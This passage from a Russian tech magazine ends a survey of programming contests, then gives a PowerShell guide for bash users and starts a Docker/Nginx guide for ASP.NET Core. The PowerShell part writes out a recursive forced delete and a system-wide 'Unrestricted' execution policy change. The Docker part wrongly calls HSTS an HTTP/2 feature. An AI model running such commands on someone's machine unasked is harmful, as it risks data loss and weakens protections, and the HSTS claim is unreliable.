получить 300 тысяч руб лей, а за первые места в оптимизационном и ML‐тре‐
ках полагается 100 тысяч.


GOOGLE CODE JAM
Было бы странно, если бы у такой инновационной компании, как Google,
не было собственного чемпионата по прог раммированию, тем более что
это хороший способ привлечь талантливую молодежь в свои ряды.
  Чемпионат Google Code Jam проводится с 2003 года. Участники дол жны
решить алгоритмические задачи за фиксированное время. Особенность чем‐
пионата в том, что разрешается использовать любой язык программирования
и любую среду разработки — никаких ограничений нет, главное, чтобы учас‐
тник сумел решить задачу и закодировать ее реализацию.





                Соревнования Google Code Jam

Приз за первое место составляет 15 000 долларов. Примечательно, что пос‐
ледние пять лет (с 2014 по 2018 год) первое мес то принад лежит Геннадию
Короткевичу из Белоруссии с ником tourist, который более чем оправдан —
чемпионат за эти годы проводили в США, Ирландии и Канаде.


FACEBOOK HACKER CUP
По примеру Google социальная сеть Facebook также запус тила собственный
чемпионат  по  программирова нию,  который  проводится  с  2011  года.
При этом компания и не скрывает, что чемпионат используется как средс тво
поиска лучших умов для потенциальной работы в Facebook. Информации
об этом конкурсе малова то, даже в Википедии ничего тол ком нет, но «Хакер»
специально для тебя раз добыл подробности.





                    Чемпионат от Facebook

Постановка задачи выглядит так: условия, форматы входных/выходных дан‐
ных, а также сами входные данные в виде файла. Нужно прочитать условие,
придумать решение, реализовать его программно и протестировать. На все
про все есть шесть минут. За эти шесть минут решение можно отправлять
несколько раз, главное — уложиться в это огра ничение. Использовать можно
любой язык программирования и любую среду. Особ няком стоит Visual Stu‐
dio, поскольку в свободном дос тупе имеется толь ко Visual Studio Express.
   Структура соревнования следующая: ква лифи кационный раунд, первый
и второй раунды, финал. Квалификационный раунд длится 72 часа, и участни‐
кам нужно решить хотя бы одну из предложенных задач. На решение задачи
дается шесть минут. Первый раунд сос тоит из трех отдельных подраундов,
на каждый из которых отведено по три часа. Лучшие 1000 программис тов
проходят во второй раунд. Участвовать можно во всех трех подраундах,
при условии, что ты не попал в top‐1000 в одном из пре дыду щих подраундов.
Поэтому во второй раунд выходит 3000 человек. Второй раунд длится тоже
три часа. Призы этого раунда распределяются так: top‐300 получают уте‐
шительные футболки; top‐25 едут в Калифорнию участвовать в финале.
  Ограничений практически нет, если не счи тать воз растного — тебе дол‐
жно быть как минимум 18 лет, и ты не должен работать в Facebook.
  Первое место в 2017 году занял рос сийский программист Пётр Митричев,
а в 2014 и 2015 годах первые места принадлежат уже известному Геннадию
Короткевичу. В общем зачете по количес тву побед лидирует Россия, на вто‐
ром месте — Белоруссия, на третьем — Япония.
  Призы здесь поскромнее, чем у Google, — 5000 дол ларов за первое мес‐
то, 2000 — за второе и 1000 — за третье. Также компания платит утешитель‐
ные 100 долларов участникам, занявшим с 4‐го по 25‐е мес та. Ко всему это‐
му прилагаются бесплатные билеты в Калифорнию и проживание в кампусе
Facebook. Суммы доволь но скромные, но ведь главное — это потенциальная
работа в Facebook, где можно зарабо тать гораздо больше, чем полагается
за первое место. Кстати, ты еще можешь успеть зарегистрироваться в Face‐
book Hacker Cup 2018 — поспеши.


TOPCODER OPEN
Topcoder Open — ежегодный международный турнир, который проводит ком‐
пания Topcoder Inc. с 2001 года. Считается, что это что‐то вроде чемпионата
мира среди про фи — в нем участвуют только лучшие из лучших.





                            TCO2017

Принять участие может любой человек, достигший 18 лет. Ежегодно в тур‐
нире участвуют 4000 прог раммистов. Пос ледний раз чемпионат проводил ся
в октябре 2017 года, так что у тебя есть еще время попытать удачи, тем более
что приз более чем достойный — 15 000 долларов за первое место.


НЕСКОЛЬКО МЫСЛЕЙ
Хочется поучаствовать, да еще и немного заработать, но пока ты не опре‐
делил ся, с чего начать? Сложнее всего учас твовать в ACM/ICPC — ты дол жен
быть студентом или аспирантом, жес ткие огра ничения по возрасту, языку
программирования, вузу (не каждый вуз будет спонсировать участие в этой
олимпиаде), нужна команда и так далее. В общем, дол жно совпасть сразу
множество факторов.
  Проще всего попытаться участвовать в Яндекс.Алгоритм. Далеко ехать
не придется, команда не нужна, приз тоже достойный — практически такой
же, как на Facebook Hacker Cup. Да еще и есть воз можность ознакомиться
с примерами задач.
   Участвовать в Google Code Jam и Facebook Hacker Cup можно не только
ради денежного вознаграждения, но и ради возможности получить работу
в этих известных компаниях. Google более щедрая, а Facebook, видимо, ищет
энтузиастов, для которых день ги не на первом мес те.
АДМИН

POWERSHELL
   ДЛЯ ТЕХ, КТО В БАШЕ





                                        Алексей Zemond
                                           Панкратов
                                           3em0nd@gmail.com




      ПРОБУЕМ НАЙТИ АНАЛОГИ
    НАИБОЛЕЕ РАСПРОСТРАНЕННЫХ
            ТУЛЗ UNIX В PS





При  переходе  с  bash  на  PowerShell  часто  возникают
неудобс тва, связанные с незнанием, какие есть аналоги
в пошике и как ими пользоваться. К примеру, лично мне
очень нравится bash своей логикой. Вот нужно тебе из тек‐
стового файла найти только что‐то опре деленное, и ты зна‐
ешь, что для этого нужно задейство вать, скажем, cat и grep.
А вот при написании подобного на пошике часто воз никает
полный ступор. И вроде вся логика понятна, и скрипт‐то
в одну строку, а как реализовать — неясно. Именно с этим
и предлагаю разобраться.


             INFO

                     Про общий син таксис и основы языка PowerShell
                       написано  немало,  есть  огромное  количество
                       литературы, статей и видео на данную тему. Те
                    же циклы и счетчики описаны уже не по одному
                        десятку  раз, поэто му в данной статье о них
                        ничего не рассказано. Если вдруг про пошик ты
                        узнал совсем недавно, то есть смысл обратиться
                        в гугл с банальным зап росом вида «powershell tu‐
                                 torial for beginners pdf».



ОБЩИЕ ПРАВИЛА ИГРЫ
Сперва давай разберемся с наиболее простым, но не менее важным —
с тем, как работать с переменными. Скажем, если в bash для объявления
переменной достаточно написать foo=1, то для PowerShell нужно добавить
знак доллара — $foo=1. Для вывода зна чения переменной на экран можно
воспользоваться универсальным echo или, если работаешь с пошиком,
командлетом Write‐Host. Длиннее? Да, безусловно, но при этом с помощью
данного командлета можно весьма интересно управлять выводом:


Write‐Host (2,4,6,8,10,12) ‐Separator "‐>" ‐ForegroundColor DarkMa
genta ‐BackgroundColor White

К примеру, данный код выведет последова тельность цифр в скобках, между
цифрами поставит знак ‐> плюс рас кра сит бэкграунд и сам текст. Конечно,
для скрипта на коленке это не нужно, но вот для каждодневного отче та
почему бы и нет.



               Пример работы командлета Write‐Host

Нужно что‐либо сравнить? Для это го есть целая таблица, которая так
или иначе знакома любому линуксоиду:


 Аргумент    Тип        Описание

 eq             Equal         Равно

  ne            Not equal     Не равно

                  Greater  than
 ge                         Больше или рав но
                   or equal

  gt              Greater than    Больше

    lt              Less than      Меньше

                 Less    than
  le                        Меньше или рав но
                   or equal

                          Использование символов подстановки для поис‐
                  Wildcard
  like                            ка соот ветствия образцу.
                comparison
                          Пример: "file.doc" like "f*.do?"

                          Использование символов подстановки для поис‐
                  Wildcard
  notlike                         ка несо ответствия образцу.
                comparison
                          Пример: "file.doc" notlike "p*.doc"

                 Regular  ex‐
                          Использование регуляр ных выражений для поис‐
  match           pression
                                 ка соот ветствия образцу
                comparison

                 Regular  ex‐
                          Использование регуляр ных выражений для поис‐
  notmatch        pression
                                 ка несо ответствия образцу
                comparison

                Replace       Заменяет часть или все значение слева от опе‐
  replace
                  operator       ратора

                        Определяет, содер жит ли значение слева от опе‐
                               ратора значение справа. В отличие от предыду‐
                 Containment
  contains                   щих операто ров результатом является булево
                  operator
                               значение.
                          Пример: 1,2,3 contains 1

                        Определяет, что значение слева от оператора
                 Containment    не  содержит  значения  справа.  Результат —
  notcontains
                  operator       булево значение.
                          Пример: 1,2,3 notcontains 4

Для логических операторов это:


 Аргумент    Описание

             Оба усло вия должны быть истинны,  что бы выражение было
  and            истинно.
              Пример: (1 eq 1) and (2 eq 2)

             Одно или оба условия дол жны быть истинны, чтобы выражение
  or           было истинно.
              Пример: (1 eq 1) or (1 eq 2)

             Одно усло вие должно быть истинно, а второе должно иметь зна‐
  xor
                чение «ложь», чтобы выражение было истинно

                Указанные  усло вия  должны  иметь  значение  «ложь»,  чтобы
  not           выражение было истинно.
              Пример: not (1 eq 2)

                Указанное условие дол жно иметь значение «ложь», чтобы выраже‐
   !             ние было истинно.
              Пример: ! (1 eq 2)

Также будет полезно для типов:


 Аргумент    Описание

  is            Яв ляется типом

  isnot         Не явля ется типом

  as             Как тип, без ошибки, если воз никает неудача преобразования

Если с операторами сравнения и логическими условиями все более‐менее
прозрачно, то вот с типом я бы рас смотрел простенький при мер. Вот, ска‐
жем, нужно нам узнать среднее время ответа от сайта xakep.ru. Для этого
нужно сде лать серию пин гов и высчитать среднее вре мя ответа. Набросаем
простой скрипт:


Write‐Host `n "Waiting for test ..."
$Avg = 0
$Site = "www.xakep.ru"
$PingSite = Test‐Connection ‐Count 5 $Site
$Avg = ($PingSite | Measure‐Object ResponseTime ‐Average)
$Calc = ($Avg.average) ‐as [int]
Clear‐Host
Write‐Host "Average response time to $Site is $Calc ms"

Если использовать данный код без типа int, мы получим дробное значение,
что нам не очень нужно.





                         Пример кода


АЛИАСЫ
Для упрощения работы с PowerShell можно использовать алиасы. Думаю,
тебе будет интересно самому взглянуть на список актуальных алиасов в сво‐
ей системе. Для это го нужно выполнить командлет Get‐Alias.
  С помощью алиасов можно ссылаться даже на программы. К примеру,
сделаем алиас на запуск калькулятора.


Set‐Alias ‐Name calc ‐value calc.exe

Теперь при вводе calc у нас будет запускаться калькулятор. Если хочется
записать на алиас какую‐нибудь команду с параметрами, то нужно исполь‐
зовать функцию


function AL01 {Test‐Connection ‐Count 2 xakep.ru}
Set‐Alias ping AL01

При вызове нашего алиаса по имени ping мы сделаем два пинга до сервера
xakep.ru. Чтобы удалить ненужный для нас алиас, сущес твует команда


Remove‐Item alias:ping

Стоит отме тить, что после закрытия оболочки PowerShell все созданные али‐
асы будут удалены. Чтобы этого не про исходило, их нужно сохранить в свой
пользовательский профиль. Вообще для PowerShell существует аж четыре
профиля. Посмотреть их можно командой


$profile | Format‐List ‐Force

А протестировать на наличие в системе — командой


$profile | Format‐List ‐Force | ForEach‐Object (Test‐Path _$)

Если в ответ возвращается False, то их прос то нет. Создадим наш файл,
к примеру по первому пути:


C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1

и в него напишем наши алиасы:


function AL01 {Test‐Connection ‐Count 2 xakep.ru}
Set‐Alias ping AL01

После сохранения и перезапуска пошик будет автоматичес ки подгружать
данный файл, и теперь настройки никуда не денут ся. Стоит упомянуть и что
по умолчанию в системе отключен запуск любых сценариев и, скорее все го,
наш внешний файл будет заб ракован системой. Чтобы этого не произошло,
давай посмотрим, что стоит в политике. Выполни в консоли PowerShell:


Get‐ExecutionPolicy

Скорее всего, система вер нет значение Restricted, что как раз означает зап‐
рет выполнения сценариев. Что бы это обойти, выполни из‐под администра‐
тора:


Set‐ExecutionPolicy Unrestricted

После подтверждения сценарии будут запус каться без ошибок и наш файл
тоже будет работать.


ПОГРУЖАЕМСЯ ГЛУБЖЕ
Теперь давай перейдем к наиболее вос требованным тулзам «Линукса» и их
аналогам в PowerShell. Начнем, как обычно, от простого к сложному.


cd
Перемещение по каталогам. Здесь можно исполь зовать одноименный алиас
cd либо воспользоваться командлетом Set‐Location.


Set‐Location .\Bar

Выпол нив данную команду, ты перейдешь в папку Bar в текущем каталоге.
Можно перемещаться и по реес тру:


Set‐Location ‐Path "HKLM:"
Set‐Location ‐Path "HKEY_LOCAL_MACHINE\SYSTEM\Software\Microsoft\CTF"


ls, dir
Отображение содержимого катало га. Можно использовать одноименные
алиасы либо Get‐ChildItem:


Get‐ChildItem C:\

покажет, что содержит в себе диск С:. Также можно воспользоваться раз‐
личными параметрами для удобства вывода. К примеру, аналог команды
ls ‐ltr будет


Get‐ChildItem $env:USERPROFILE\Documents | Sort‐Object ‐Property
LastWriteTime

В данном случае мы увидим последние измененные файлы в заданном
каталоге. Чтобы рекур сивно посмотреть все директории, можно вос поль‐
зоваться вот такой командой:


Get‐ChildItem ‐Path C:\ ‐Force ‐Recurse


mkdir
Создание новой директории. В данном случае мы будем использовать New‐
Item. Для создания директории выполним


New‐Item ‐ItemType Directory ‐Name 'foobar'

А вот так можно создать новую поддиректорию bar в директории c:\foo.


New‐Item ‐ItemType "directory" ‐Path "c:\foo\bar"

А если мы хотим создать текстовый файл в текущей директории с опре делен‐
ным текстом внутри, то выполним


New‐Item ‐Path . ‐Name "foobar.txt" ‐ItemType "file" ‐Value "Xakep.
ru rulezz!"


touch
Создание файлов. Для создания новых фалов, так же как и новых папок,
используется один и тот же командлет New‐Item. Различия лишь в его
параметрах.


New‐Item ‐ItemType "file" ‐Path "c:\foo\xakep.txt", "c:\foo\bar\
xakep.log"

Данным кодом мы создадим два файла — xakep.txt и xakep.log — в соответс‐
твующих директориях c:\foo и c:\foo\bar.


cp
Копирование файлов из одного катало га в дру гой. В среде PowerShell
для этого нужен командлет Copy‐Item. Для прос того копирования можно вос‐
пользоваться следующим син таксисом:


Copy‐Item ‐Path C:\foo\1.txt ‐Destination C:\bar\

Так же можно копировать файлы по сети:


Copy‐Item ‐Path C:\foo.txt ‐Destination '\\descsrv1\f$\foo.txt'


rm
Удаление файлов. Аналогом служит Remove‐Item. Думаю, многие знают
команду rm ‐rf , которая удаляет все из заданного каталога. Для пошика дан‐
ная команда будет иметь вид:


Remove‐Item ‐Recurse ‐Force


           WARNING

                 Rm ‐rf, как и Remove‐Item ‐Recurse ‐Force, — одна
                       из опаснейших команд, которые могут доставить
                          кучу седых волос админис тратору. Выполнять их
                   можно только после полной уверенности и прог‐
                       нозируемости результата. Из лайфхаков можно
                      предложить перед удалением сделать выборку
                    файлов через ls, dir или Get‐ChildItem, чтобы уви‐
                        деть то, что будет удалено. Еще интересна прак‐
                         тика не удалять, а переиме новывать файлы, что
                        дает возможность при проб лемах быстро восста‐
                        новить рабочее состояние.


Так же можно удалять файлы по мас ке:


Remove‐Item *.txt

или выборочные файлы:


Remove‐Item C:\dir1\foo, C:\dir1\bar, C:\dir2\foobar


find
Поиск различных файлов. В данном случае можно воспользоваться Get‐
ChildItem. К примеру, командой


Get‐ChildItem C:\ ‐include *.exe ‐Recurse

мы получим все экзешные файлы, какие есть на нашем диске С. Чтобы
не лезть в недра папки Windows, можно ограничить глу бину параметром ‐
Depth 2. Можно еще больше усложнить за счет параметра ‐Exclude:


Get‐ChildItem ‐Path "C:\foo\*.exe" ‐Filter "*xakep*" ‐Depth 2
‐Exclude "*server*" ‐Recurse

Как видишь, можно весьма неплохо  управлять выводом, не прибегая
к использованию регулярных выражений.


cat
Утилита, выводящая последова тельно ука занные файлы, объединяя их в еди‐
ный поток. Аналог в пошике Get‐Content. В простом виде будет выглядеть вот
так:


Get‐Content ‐Path C:\foo\bar.txt


tail
Весьма полезная утилита, по дефолту выводящая последние десять строк
указанного файла. Здесь также используется Get‐Content.


Get‐Content c:\foo\Log.txt ‐TotalCount 10

Для отладки в реальном времени может быть полезен параметр ‐wait:


Get‐Content "C:\foo\logs.txt" ‐Wait | Where { $_ ‐Match "Error" }

В данном случае мы монито рим файл logs.txt, и, если в нем появляются стро‐
ки с Error, скрипт нам их покажет.


grep
Утилита, которая находит все совпадения, заданные условием. К сожале нию,
полного аналога grep в PowerShell не существу ет. Но есть некоторые хит‐
рости. К примеру, если мы хотим получить выборку из процессов системы
с размером более 100 Мбайт, выполним


Get‐Process | Where‐Object { $_.WorkingSet ‐gt 104857600 }

В данном случае мы задействовали Where‐Object, который помогает нам
отфильтровать наш запрос. Усло вия отбора можно объединять логическими
операторами:


Get‐Process | Where‐Object ‐FilterScript { ($_.WorkingSet ‐gt 104857
600) ‐and ( $_.ProcessName ‐eq "chrome" ) }

Where‐Object работает с объектами, если нам нужно работать со строками,
то следует использовать Select‐String.


Select‐String ‐Path C:\foo\*.log ‐Pattern "bar"

Объединим с Get‐Content:


Get‐Content ‐Path C:\foo\bar.txt | Select‐String ‐Pattern "foobar"


uname
Команда, которая выводит информацию о системе. К при меру, одна из рас‐
пространенных команд выглядела как uname ‐a, в нашем случае это будет


$Properties = 'Caption', 'CSName', 'Version', 'BuildType', 'OSArch
itecture'
Get‐CimInstance Win32_OperatingSystem | Select‐Object $Properties |
Format‐Table ‐AutoSize

Длинно? Однозначно, но часто ли используется данная команда? На крайний
случай ее можно прописать в алиасы.


mkfs
Создание файловой системы. Здесь есть командлеты New‐Volume или For‐
mat‐Volume. К примеру, вот эта команда создаст новое хранилище в пуле
CompanyData с фиксированным значением, отформатирует том и наз начит
букву М:


New‐Volume ‐StoragePoolName "CompanyData" ‐FriendlyName "TestVolume"
‐Size 10GB ‐ResiliencySettingName "Mirror" ‐FileSystem NTFS ‐Access
Path "M: "‐ProvisioningType Fixed


           WARNING

                    При играх с подобными командами будь готов
                          к тому, что один из тво их дисков со всем содер‐
                   жимым может превратиться в винегрет. Поэтому
                     прежде  чем  начинать  тестировать  команды
                       на боевом сервере, для начала пот ренируйся
                       на тестовом железе или виртуалках.



ping
Проверка доступности сетевого ресурса. Одна из самых распространенных
команд, ее аналог — Test‐Connection.


Test‐Connection xakep.ru


cut
Команда выборки отдельных полей из файла. В пошике при работе с объ‐
ектами можно сохранить только определен ные, необ ходимые для нас свой‐
ства. Для этого можно использовать Select‐Object. Допустим, нам нужно пос‐
мотреть все TXT‐файлы, которые находят ся в содержимом каталога своего
пользователя:


Get‐ChildItem $env:USERPROFILE ‐Filter "*.txt"

но столько полей нам не нуж но, вос пользуемся Select‐Object:


Get‐ChildItem $env:USERPROFILE ‐Filter "*.txt" | Select‐Object
‐Property 'Name', 'Length'





                         Пример кода


man
Команда из категории must have. Конечно же, здесь ей есть достойный ана‐
лог в виде Get‐Help.


Get‐Help Get‐ChildItem

При использовании символа подстановки можно получить различные сочета‐
ния, к примеру узнать, какие есть командлеты, начина ющиеся на Get‐:


Get‐Help Get‐*


ЗАКЛЮЧЕНИЕ
Как видишь, практически у всех утилит есть свои дос тойные замены. Конечно,
где‐то они не так элегантны, как в Unix, но это по большому счету дело при‐
вычки и опыта. Главное — про бовать, анализировать и верить в свои силы!
АДМИН





   Алексей Соммер
   asommer@yandex.ru

ПАКУЕМ ПРИЛОЖЕНИЯ
ASP.NET CORE
С ПОМОЩЬЮ DOCKER
МИКРОСЕРВИСЫ
ПО-МИКРОСОФТОВСКИ





Кажется, Microsoft все больше и больше любит Linux! При-
ложения ASP.NET Core теперь по-настоящему кросс-плат-
форменны и могут запускаться в «никсах», а соответственно,
и в Docker. Давай посмотрим, как их можно упаковать, чтобы
развертывать на Linux и использовать в связке с Nginx.


Î «ÄÎÊÅÐÅ»
О микросервисной архитектуре слышали практически все. Сам концепт раз-
бития приложения на части не сказать чтобы новый. Но, как известно,
новое — это хорошо забытое и переработанное старое.
   Если постараться рассказать об архитектуре в нескольких словах, то
веб-приложение разбивается на отдельные унитарные части — сервисы.
Сервисы не взаимодействуют между собой напрямую и не имеют общих баз
данных. Это делается для возможности изменять каждый сервис без пос-
ледствий для других. Сервисы упаковываются в контейнеры. Среди контей-
неров правит бал Docker.
  Для того чтобы описать, что такое Docker, очень часто упрощенно исполь-
зуют термин «виртуальная машина». Сходство определенно есть, но говорить
так неправильно. Проще всего это различие понять, посмотрев на сле-
дующие изображения из официальной документации «Докера».





                               Docker





                      Виртуальная машина

Контейнеры используют ядро текущей операционной системы и делят его
между собой. В то время как виртуальные машины с помощью hypervisor
используют аппаратные ресурсы.
  Образ/Image «Докера» — это read-only-объект, который, по сути, хранит
в себе шаблон для построения контейнера. Контейнер — это среда,
в которой выполняется код. Образы хранятся в репозиториях. Например,
официальный репозиторий Docker Hub позволяет хранить приватно только
один образ. Впрочем, это бесплатно, так что даже за это нужно их поблагода-
рить.


             INFO

                       «Докер» не единственный предоставляет контей-
                       неризацию: существуют и другие  технологии.
                     Например,   rkt   (произносится   как   «рокет»)
                         от CoreOS, LXD  (произносится  как  «лексди»)
                         от Ubuntu, Windows Containers ни за что не уга-
                       даете от кого.
                        Разбирать установку «Докера» особого смысла
                           нет, ведь его можно установить на множество
                      операционных систем. Укажу только, что скачать
                        его под свою платформу можно из Docker Store.
                      Если ты устанавливаешь Docker под Windows, то
                      необходимо, чтобы в BIOS и в ОС была включена
                      виртуализация. О том, как включить ее в «десят-
                            ке», можно прочитать в статье «Установка Hyper-V
                        в Windows 10».


Теперь, когда мы ознакомились с теорией, давай перейдем к практике.


ÑÎÇÄÀÍÈÅ ÏÐÎÅÊÒÀ Ñ ÏÎÄÄÅÐÆÊÎÉ «ÄÎÊÅÐÀ»
«Докер» — это, конечно, линуксовый продукт, но при необходимости можно
его использовать при разработке под Mac или под Windows. При создании
проекта в Visual Studio для добавления поддержки «Докера» достаточно пос-
тавить флажок Enable Docker Support.
  Поддержку «Докера» можно включить и в существующий проект. Добав-
ляется она таким же образом, как и различные новые компоненты: контекс-
тное меню Add → Docker Support.
   Если на твоей машине установлен и запущен «Докер», будет автоматичес-
ки открыта консоль и выполнена команда


$ docker pull microsoft/aspnetcore:2.0

которая запускает скачивание образа. Этот образ фактически заготовка,
на основе которой будет создан твой образ. ASP.NET Core 2.1 использует уже
другой образ — microsoft/dotnet:sdk.
  В директории с решением для тебя будут автоматически созданы сле-
дующие файлы: .dockerignore (исключение файлов и директорий из образа
«Докера»), docker-compose.yml (с помощью этого файла можно сконфигури-
ровать  выполнение  нескольких  сервисов),  docker-compose.override.yml
(вспомогательная  конфигурация  docker-compose),  docker-compose.dcproj
(файл проекта для Visual Studio).
  В  директории  с  проектом  создастся файл  Dockerle. Собственно,
с помощью этого файла мы и создаем свой образ. По умолчанию (в случае
если проект называется DockerServiceDemo) он может выглядеть примерно
так:


FROM microsoft/aspnetcore:2.0 AS base
WORKDIR /app
EXPOSE 80
FROM microsoft/aspnetcore-build:2.0 AS build
WORKDIR /src
COPY DockerServiceDemo/DockerServiceDemo.csproj DockerServiceDemo/
RUN dotnet restore DockerServiceDemo/DockerServiceDemo.csproj
COPY . .
WORKDIR /src/DockerServiceDemo
RUN dotnet build DockerServiceDemo.csproj -c Release -o /app
FROM build AS publish
RUN dotnet publish DockerServiceDemo.csproj -c Release -o /app
FROM base AS final
WORKDIR /app
COPY --from=publish /app .
ENTRYPOINT ["dotnet", "DockerServiceDemo.dll"]

Начальная конфигурация для .NET Core 2.0 не позволит сразу построить
образ с помощью команды docker build. Она настроена на то, что будет
запущен файл docker-compose из директории уровнем выше. Чтобы постро-
ение пошло успешно, Dockerle можно привести к подобному виду:


FROM microsoft/aspnetcore:2.0 AS base
WORKDIR /app
EXPOSE 80
FROM microsoft/aspnetcore-build:2.0 AS build
WORKDIR /src
COPY DockerServiceDemo.csproj DockerServiceDemo.csproj
RUN dotnet restore DockerServiceDemo.csproj
COPY . .
WORKDIR /src
RUN dotnet build DockerServiceDemo.csproj -c Release -o /app
FROM build AS publish
RUN dotnet publish DockerServiceDemo.csproj -c Release -o /app
FROM base AS final
WORKDIR /app
COPY --from=publish /app .
ENTRYPOINT ["dotnet", "DockerServiceDemo.dll"]

Все, что я сделал, — убрал лишнюю директорию DockerServiceDemo.
   Если ты используешь Visual Studio Code, то файлики придется генери-
ровать вручную, хотя в VS Code и имеется вспомогательная функциональ-
ность в виде расширения Docker. Добавлю ссылку на мануал, как работать
с «Докером» из VS Code: Working with Docker. Да, статья на английском,
но она ведь с картинками. :)


ÒÐÈ ÀÊÊÎÐÄÀ «ÄÎÊÅÐÀ»
Для ежедневной работы с «Докером» достаточно помнить всего лишь нес-
колько команд.
  Самая главная команда — это, конечно, построение образа. С помощью
bash/CMD/PowerShell заходим в директорию, где лежит Dockerle, и выпол-
няем команду


$ docker build -t your_image_name .

Здесь после параметра -t задается имя твоего образа. Внимание: в конце
команды после пробела точка. Эта точка означает, что используется текущая
директория. Образ можно пометить каким-нибудь тегом (номером или наз-
ванием). Для этого после имени поставить двоеточие и указать тег. Если это-
го не сделать, то по умолчанию будет задан тег latest. Чтобы отправить образ
в репозиторий, в имя образа нужно включить имя репозитория. Примерно
так:


docker build -t docker_account_name/image_name:your_tag .

Здесь your_docker_account_name — это имя твоего аккаунта в docker hub.
   Если ты создал образ только с локальным именем, не включающим в себя
репозиторий, то пометить образ другим именем можно и после построения
с помощью следующей команды:


$ docker tag image_name docker_account_name/image_name:your_tag

Чтобы отправить изменения в хаб, теперь нужно выполнить


$ docker push docker_account_name/image_name:your_tag

Перед этим необходимо зайти в твой аккаунт «Докера». На Windows это дела-
ется из UI приложения, а вот на *nix — командой


$ docker login

На самом деле трех команд недостаточно. Необходимо еще иметь воз-
можность проверить работу контейнера. Команда, с помощью которой можно
запустить контейнер, выглядит так:


$ docker run -it -p 5000:80 image_name

Параметр -it создаст псевдо-TTY, и твой контейнер будет отвечать на зап-
росы. После запуска команды сервис станет доступным по адресу http://
localhost:5000/. Параметр -p 5000:80 связывает 5000-й порт контейнера
с 80-м портом хоста.
  Кроме того, есть такие команды:
 • docker ps -a — покажет список контейнеров. Так как добавлен ключ -a,
   то будут отображены все контейнеры, а не только те, которые запущены
   на данный момент;
 • docker rm container_name — эта команда удалит контейнер с именем
   container_name (rm — сокращение от remove);
 • docker logs container_name — отобразит логи контейнера;
 • docker rmi image_name — удалит образ с именем image_name.


ÇÀÏÓÑÊ ÊÎÍÒÅÉÍÅÐÀ ×ÅÐÅÇ ÎÁÐÀÒÍÛÉ ÏÐÎÊÑÈ-ÑÅÐÂÅÐ
Дело в том, что сами приложения .NET Core используют свой веб-сервер
Kestrel. Этот сервер не рекомендуется для работы на production. Почему?
Есть несколько объяснений.
   Если несколько приложений делят между собой IP и порт, то Kestrel
не сможет распределять трафик. Кроме того, обратный прокси-сервер пре-
доставляет дополнительный слой безопасности, упрощает балансировку наг-
рузки и настройку SSL, а также лучше интегрируется в существующую
инфраструктуру. Для большинства разработчиков главная причина необ-
ходимости реверс-прокси именно в дополнительной безопасности.
  Мы сперва восстановим начальную конфигурацию Dockerle, а после раз-
беремся с файлом docker-compose.yml и попробуем запустить наш сервис
в одиночку. Мой файл docker-compose, созданный по умолчанию, выглядит
так:


version: '3.4'
services:
  dockerservicedemo:
    image: ${DOCKER_REGISTRY}dockerservicedemo
    build:
      context: .
      dockerfile: DockerServiceDemo/Dockerfile

Файл docker-compose.override.yml добавляет в конфигурацию несколько
настроек:


version: '3.4'
services:
  dockerservicedemo:
    environment:
      - ASPNETCORE_ENVIRONMENT=Development
    ports:
      - "80"

Построить созданное решение мы можем с помощью docker-compose build,
а вызвав команду docker-compose up, мы запустим наш контейнер. Все
работает? Тогда переходим к следующему шагу. Создаем файл nginx.info.
Конфигурация будет примерно следующая:


worker_processes 4;
events { worker_connections 1024; }
http {
    sendfile on;
     upstream app_servers {
        server dockerservicedemo:80;
    }
    server {
    listen 80;
    location / {
        proxy_pass         http://app_servers;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection keep-alive;
        proxy_set_header   Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;
      }
    }
}

Здесь мы указываем, что nginx будет прослушивать 80-й порт (listen 80;).
А полученные запросы будет переадресовывать на 80-й порт хоста в контей-
нер dockerservicedemo. Кроме того, мы указываем nginx, какие заголовки
необходимо передавать дальше.
  Мы можем использовать HTTP в nginx, а доступ к веб-сайту настроить
через HTTPS. Когда HTTPS-запрос проходит через HTTP-прокси, то много
информации из HTTPS не передается в HTTP. Кроме того, при использовании
прокси теряется внешний IP-адрес. Чтобы эта информация передавалась
в заголовках, необходимо изменить код нашего ASP.NET-проекта и добавить
в начало метода Congure файла Startup.cs следующий код:


app.UseForwardedHeaders(new ForwardedHeadersOptions {
    ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.
XForwardedProto
});

Большинство прокси-серверов используют заголовки X-Forwarded-For и X-
Forwarded-Proto. Именно эти заголовки и указаны сейчас в конфигурации
nginx.
   Теперь включим образ nginx и файл nginx.conf в конфигурацию docker-
compose. Осторожно, в YAML пробелы имеют значение:


version: '3.4'
services:
  dockerservicedemo:
    image: ${DOCKER_REGISTRY}dockerservicedemo
    build:
      context: .
      dockerfile: DockerServiceDemo/Dockerfile
    ports:
      - 5000:80
  proxy:
    image: nginx:latest
    volumes:
      - ./DockerServiceDemo/nginx.conf:/etc/nginx/nginx.conf
    ports:
      - 80:80

Здесь мы добавляем к нашей конфигурации прокси в виде образа nginx.
К этому образу «цепляем» внешний файл настроек. Его мы как бы монтируем
в файловую систему контейнера с помощью механизма под названием
volume. Если добавить в конец :ro, то объект будет смонтирован только
для чтения.
   Прокси слушает внешний 80-й порт машины, на которой запущен контей-
нер, и передает запрос на внутренний 80-й порт контейнера.
  Выполнив команду docker-compose up, мы запулим, то есть извлечем
из репозитория, образ nginx и стартанем наш контейнер вместе с контей-
нером прокси. Теперь по адресу http://localhost:80/ он будет доступен
через nginx. На 5000-м порте приложение крутится еще и под Kestrel.
  Проверить, что запрос к веб-приложению проходит через реверс-прокси,
мы можем так: открыть в браузере Chrome developer tools, зайти на закладку
Network, здесь кликнуть на localhost и выбрать закладку Headers.





                    Заголовки ответа в Chrome


ÇÀÏÓÑÊÀÅÌ ÊÎÍÒÅÉÍÅÐ ×ÅÐÅÇ ÏÐÎÊÑÈ È HTTPS
Версия ASP.NET Core 2.1 принесла с собой улучшения поддержки HTTPS.
Скажем, такой middleware позволяет совершать редирект с незащищенного
соединения на защищенное:


app.UseHttpsRedirection();

А следующий позволяет использовать HTTP Strict Transport Security Protocol —
HSTS.


app.UseHsts();

HSTS — это фича из протокола HTTP/2, спецификация которого была
выпущена  в  2015  году.  Поддерживается  современными  браузерами
и информирует о том, что веб-сайт использует только HTTPS. Так обес-
печивается защита от downgrade-атаки, во время которой атакующий может,
